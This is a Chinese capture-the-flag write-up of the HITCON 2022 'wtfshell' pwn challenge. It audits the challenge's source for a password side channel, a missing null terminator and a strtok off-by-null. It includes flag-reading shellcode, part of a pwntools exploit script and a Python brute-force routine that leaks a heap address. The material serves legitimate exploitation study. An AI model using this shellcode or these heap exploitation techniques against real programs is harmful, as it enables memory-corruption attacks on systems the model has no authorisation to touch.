
```asm
syscall;
push 3;
pop rbx;
push 0x100000;
pop rcx;
xor rdx, rdx;
push 0x127;
pop rax;
int 0x80;
xor rdi, rdi;
push rsp;
pop rsi;
add rsi, 0x200;
push rsi;
pop rbx;
push 0x100;
pop rdx;
xor rax, rax;
syscall;
push 1;
pop rdi;
push 0x100;
push rbx;
push rsp;
pop rsi;
push 1;
pop rdx;
push 20;
pop rax;
syscall;
```

```python
sleep(0.1)
r.send(b'/flag2\x00\x00' + shellcode)
qwq(heap_base)
qwq(libc_base)
r.interactive()
```

至此，`wtfshell2` get

![3](upload/attach/202212/959503\_6G5BG93EJSNVTXC.jpg)

# 前言

征战hitcon2022，pwn手坐大牢，`wtfshell`这道题审了三小时源码，只看出来一个`chk_pw`侧信道+`read_pw`未置零，最终可以通过侧信道leak出一个heap地址，没有看出其余的洞，最终放弃。

`wtfshell1`最终解数为4，`wtfshell2`最终解数为3。第一题解出来了第二题基本就解出来了。

感谢`crazyman`第二天来告诉我`wtfshell`的主要漏洞（`strtok` off by null），思考后脑子里出现了一套完整的利用思路。因此做出如下复现。

文章不太喜欢附图，大家多包涵，做出来难度还是蛮大的，因为即使知道了`strtok->off-by-null`，还是有非常多细节需要思考☹️。

## 代码审计

题目提供了源码，一共930+行，libc为`glibc2.36 3`，由于`glibc-all-in-one`中找不到该版本libc，因此我换了一个小版本，用`glibc2.36 4`进行复现。

### 程序主要逻辑

程序实现了一个类似于shell交互，输入`rtfm`可以查看菜单：

```
π    rtfm.            Read This Friendly Manual    π
π    qq.            Quit Quietly            π
π    lol,[-l].        List Of fiLes            π
π    rip.[FILE]        Redirect InPut            π
π    nsfw,FILE,PERM.        New Single File for Writing    π
π    wtf,DATA,FILE.        Write data To File        π
π    omfg,FILE.        Output My File Gracefully    π
π    gtfo,FILE.        GeT the File Out        π
π    ouo.            Output current User Out        π
π    stfu,USER.        SeT new Friendly User        π
π    asap,[USER].        ASsign A new Password        π
π    sus,USER.        Switch USer            π
π    shit.            SHell InformaTion        π
π    irl.            Instantly Reset shelL        π
```

功能主要为：

- `lol`：展示所有files文件，加上`-l`命令可以查看①文件所属用户，②文件size，③文件名。

- `rip`：向指定文件末尾添加内容，采用`realloc`+`strcat`实现，其中`realloc_size`为`data_size`+1，防止strcat末尾`\x00`造成off by null。

- `nsfw`：创建文件，并定制其权限（rw）。

- `wtf`：重新覆写文件内容，最大size为`0x400`。

- `omfg`：打印文件内容（若文件具有可读属性）。

- `gtfo`：删除指定文件。

- `ouo`：打印当前用户名。

- `stfu`：添加新用户，可定义其name。

- `asap`：更改指定用户密码。其中调用的函数`chk_pw`存在`侧信道`泄露漏洞。

- `sus`：登录后可更换用户。

- `irl`：reset所有内容：①清除所有用户结构体，②清空所有file结构体，③free并重新申请`gbuff`。

- `qq`：退出程序前free掉`gbuff`，close了所有文件描述符，并且采用`_exit`退出。

### 漏洞点

#### 侧信道

查看`chk_pw`函数：

```c
int chk_pw(const char *pw) {
    char input;
    int pw_len = strlen(pw);
    for (int i = 0; i < pw_len + 1; i++) {
        int res = read(STDIN_FILENO, &input, 1);
        if (res < 0) {
            terminate();
        }
        if (i == pw_len) { // The last character must be a line break
            return input == '\n';
        }
        if (input == '\n') { // Ignore accidental line breaks
            i--;
            continue;
        }
        /* If password mismatch, quit immediately */
        if (input != pw[i]) {
            /* Read characters until '\n' */
            while (1) {
                int res = read(STDIN_FILENO, &input, 1);
                if (res < 0) {
                    terminate();
                }
                if (input == '\n') {
                    return 0;
                }
            }
        }
    }
}
```

可以看到逻辑为：

- 逐字符判断密码是否正确，若不正确，读取输入直到`\n`后退出。

- 若字符正确则往后继续检查，途中若遇到`\n`，直接利用`i--`来忽略

当检查途中遇到不正确的字符，且`i`并未到达`pw_len`时，我们可以通过输入`\n`符是否退出`chk_pw`来判断当前密码字符是否正确。

且若密码不正确，输入`\n`退出`chk_pw`后会打印：

```c
if (!chk_pw(gusers[i]->ushadow)) {
    /* Clear data when error occurs */
    bzero(gusers[i]->ushadow, PWMAX);
    write_str("asap: pw1 ≠ pw2\n");
    return;
}
```

因此我们可以通过接收字符来判断密码字符是否正确，达到侧信道爆破的目的。

#### user结构体

查看`user`结构体：`uname`堆指针跟在`ushadow`密码后。

```c
struct user {
    char ushadow[PWMAX];
    char *uname;
    int uid;
};
```

查看`read_pw`函数：在读满`PWMAX`size的时候，并未在末尾置零，导致`user->ushadow`与`user->uname`指针连接。

```c
int read_pw(char *dest) {
    int read_num = 0;
    while (read_num < PWMAX) {
        int res = read(STDIN_FILENO, &dest[read_num], 1);
        if (res < 0) {
            terminate();
        }
        if (dest[read_num] == '\n') {
            dest[read_num] = '\0';
            return read_num;
        }
        read_num++;
    }
    return read_num;
}
```

查看`chk_pw`函数：判断密码位数是通过`strlen`来判断的：

```c
int pw_len = strlen(pw);
```

因此结合起来，我们可以利用侧信道+结构体，来leak出一个堆地址。

#### strtok->off by null

main函数中的`gbuff`是拿来储存我们的命令字符串的，大小为`0x400`，对其有一个分割符处理：

```c
read_max(gbuff, GBSIZE);
char *token = strtok(gbuff, delim);
```

`strtok`函数会不断往字符串后面遍历，直到遇到`\x00`截断，同时`strtok`会将查找到的隔断符`delim`设置为`\x00`。

查看隔断符`delim`：

```c
const char delim[] = ".,?!";
```

其中！的ascii码值为`0x21`，若我们能在`gbuff` `0x400`大小的堆块里填入`0x408`个非零字符，同时在后面跟上一个size头低字节为`0x21`的堆块，即可通过`strtok`实现`off-by-null`。

## wtfshell1

### 泄露堆地址

首先申请一个`user`结构体，填满其pwd。本地gdb调试之后发现这样`user->uname`指针末尾为0，因此可以申请两个`user`结构体，第一个用作填充，使第二个`user`结构体的`user->uname`指针末尾不为0。

由于堆地址最低字节固定，不用泄露：

```python
def burp(name,pwd):
    addr = "\x80"
    for i in range(0x6):
        log.success("addr: " + hex(u64(addr.ljust(0x8,'\0'))))
        for j in range(0xb,0xff):
            payload = b'asap,'+name
            menu(payload)
            r.recvuntil(b"password:")
            r.send(pwd)
            r.recvuntil(b"retype password:")
            r.send(pwd+addr+chr(j)+"\n")
            data=r.recvuntil("\n",timeout=0.1)
            if b"asap: " not in data:
                addr+=chr(j)
                r.send(b'\x00\n')
                break
            else:
                continue

    return u64(addr.ljust(0x8,'\0'))
```

### 构造off-by-null

堆风水真的给整麻了。

#### 得到一个填满的gbuff堆块

首先我们需要得到一个被填满`0x408`非零字节的`gbuff`堆块。

整个程序free只能通过两种方式：①`xrealloc`，②`xfree`。

其中`xfree`函数：

```c
void xfree(void *ptr) {
    if (!ptr) {
        return;
    }
    size_t size = malloc_usable_size(ptr);
    bzero(ptr, size);
    free(ptr);
}
```

其中`malloc_usable_size`函数会获取该heap所有能写的size，也就是说紧邻该堆块的下一个堆块的`prev_size`也会被算进来清零，因此我们要避开`xfree`，只能用`xrealloc`来free。

`xrealloc`其实就是调用`realloc`函数，当我们申请一个大于当前堆块size的堆块时，`realloc`会free掉当前堆块，然后重新申请堆块，这个过程中是不会清空free的堆块内容的。

小堆风水一波，得到一个填满`0x408`非零字节的`gbuff`堆块步骤为：

1. 先利用`rip`申请一个`0x400`大小的堆块，然后利用`xrealloc`不断扩充，直到size为`0x1000`。然后`realloc(0x1100)` free掉该unsortedbin（必须用`xrealloc`去free，用`xfree`会清空堆块内容）。

2. 申请一个小堆块隔开`unsortedbin`与`top_chunk`。

3. 申请一个`0x400`大小的堆块到unsortedbin中。

4. 提前填满`0x400`大小的`tcache_list`。

5. 调用`cmd_irl`来free掉`gbuff`，由于`tcache_list`已经被填满，因此free掉的`gbuff`不会进入`tcache_list`，会变成unsortedbin，然后下一次申请，会申请`tcache_list`中第一个空闲堆块，也就是我们之前填满非零字节的一个堆块。这样就能获得一个填满`0x408`字节的`gbuff`。

#### 构造off by null

接下来就很简单能够想到在`gbuff`的下面申请一个堆块，`off-by-null`之后利用，以下文章将该堆块命名为`off-by-null-chunk`

在思考这一段时，卡了我非常久，特别鸣谢`winmt`师傅和`ln3`师傅和我激情讨论，一次次点醒我。

##### 遇到的问题

###### prev\_size

①`off-by-null-chunk`的`prev_size`我们无法控制。

首先我们知道，`off-by-null-chunk`的`prev_size`是被填满了八字节的，不然无法触发`strtok`然后触发`off-by-null`。

`gbuff`堆块与`off-by-null-chunk`是紧挨的，然后我们如果要更改`off-by-null-chunk`的`prev_size`，就必须通过`gbuff`来更改。

我们知道，我们只能控制`gbuff`堆块的前`0x400`个字节，更改不了`off-by-null-chunk`的`prev_size`。

**尝试思路一**：首先肯定要触发`off-by-null`，我想的是触发`off-by-null`之后，再次调用`cmd_irl`来free掉`gbuff`，然后申请一个普通chunk，size为`0x408`，这样就能更改到`off-by-null-chunk`的`prev_size`。

但是这样是显然行不通的，因为free掉`gbuff`的时候，会判断`gbuff`下面那个堆块的use状态，由于已经`off-by-null`，会触发`off-by-null`，但是我们的`prev_size`不合法，这样会导致程序出错。

**尝试思路二**：我详细查阅了`strtok`的作用，如果出现连续的delim分隔符会如何处理，看能不能同时利用`strtok`将`gbuff`第`0x400-0x408`个字节中非`prev_size`部分清空，同时触发`off-by-null`。最终也以失败告终。
